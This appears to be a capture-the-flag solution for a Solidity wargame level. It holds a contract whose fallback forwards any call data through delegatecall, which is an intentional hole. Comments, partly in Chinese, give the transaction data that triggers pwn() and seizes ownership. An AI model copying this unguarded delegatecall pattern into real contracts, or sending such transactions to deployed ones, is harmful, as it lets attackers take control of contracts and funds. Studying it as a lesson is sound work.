// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
// web3.utils.sha3("pwn()")
// contract.sendTransaction({data: "0xdd365b8b"})

// 使用delegatecall调用delegate合约的pwn函数
// 传递给函数的数据sendTransaction是函数的字节签名pwn()。由于Delegation合约中不存在具有此名称的函数，因此调用回退函数fallback。
// fallback 函数获取消息数据并将其传递给以delegatecall,调用delegate合约的pwn函数，修改owner。